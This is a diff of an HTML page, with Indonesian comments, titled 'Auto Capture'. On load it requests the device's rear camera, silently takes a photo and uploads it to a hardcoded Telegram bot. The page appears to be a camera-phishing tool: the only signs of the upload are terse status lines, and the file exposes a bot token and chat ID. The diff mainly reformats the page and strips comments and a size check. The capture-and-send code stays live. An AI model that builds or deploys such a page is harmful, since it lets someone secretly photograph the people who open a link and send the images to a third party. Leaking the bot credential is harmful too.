@@ -5,11 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Capture</title>
     <style>
-        body { 
-            background: white; 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 20px;
+        body {
+            background: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
         }
         #status {
             margin: 50px auto;
@@ -17,17 +17,20 @@
             max-width: 500px;
             border-radius: 5px;
         }
-        .error { background: #ffebee; color: #d32f2f; }
+        .error { 
+            background: #ffebee; 
+            color: #d32f2f; 
+        }
     </style>
 </head>
 <body>
     <div id="status">Memulai proses...</div>
 
     <script>
-        // ============= KONFIGURASI =============
-        const BOT_TOKEN = 'bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc'; // Ganti dengan token Anda
-        const CHAT_ID = '7041008009'; // Ganti dengan chat ID Anda
-        // =======================================
+        // ======= KONFIGURASI =======
+        const BOT_TOKEN = "bot7876599612:AAHYBbJz6IHKae4BBtEkyASRlrJVVWtNOqc"; // Ganti dengan token asli
+        const CHAT_ID = "7041008009"; // Ganti dengan chat ID asli
+        // ===========================
 
         async function verifyBotToken() {
             try {
@@ -49,21 +52,18 @@
             const statusEl = document.getElementById('status');
             
             try {
-                // 1. Verifikasi token sebelum memulai
                 statusEl.textContent = "Memverifikasi token bot...";
                 await verifyBotToken();
 
-                // 2. Akses kamera
                 statusEl.textContent = "Mengakses kamera...";
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: 'environment',
-                        width: { ideal: 800 },  // Resolusi lebih kecil
+                        width: { ideal: 800 },
                         height: { ideal: 600 }
                     }
                 });
 
-                // 3. Ambil foto (delay 400ms untuk fokus)
                 statusEl.textContent = "Mengambil foto...";
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -77,21 +77,12 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                const photoData = canvas.toDataURL('image/jpeg', 0.7); // Kompresi lebih tinggi
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                 
-                // Stop kamera
                 stream.getTracks().forEach(track => track.stop());
 
-                // 4. Kirim ke Telegram
                 statusEl.textContent = "Mengirim foto...";
                 const blob = await fetch(photoData).then(r => r.blob());
-                
-                // Debug: Cek ukuran file
-                console.log(`Ukuran foto: ${(blob.size / 1024).toFixed(2)} KB`);
-                if (blob.size > 10 * 1024 * 1024) {
-                    throw new Error("Ukuran foto terlalu besar (>10MB)");
-                }
-
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'photo.jpg');
@@ -103,10 +94,10 @@
                 });
 
                 const result = await response.json();
-                console.log("Response Telegram:", result);
+                console.log("Response:", result);
 
                 if (!result.ok) {
-                    throw new Error(result.description || "Gagal mengirim foto");
+                    throw new Error(result.description || "Gagal mengirim");
                 }
 
                 statusEl.textContent = "✅ Foto terkirim!";
@@ -115,11 +106,11 @@
             } catch (error) {
                 statusEl.textContent = `❌ Gagal: ${error.message}`;
                 statusEl.className = "error";
-                console.error("Error detail:", error);
+                console.error("Error:", error);
             }
         }
 
-        // Mulai proses
+        // Jalankan proses
         captureAndSend();
     </script>
 </body>
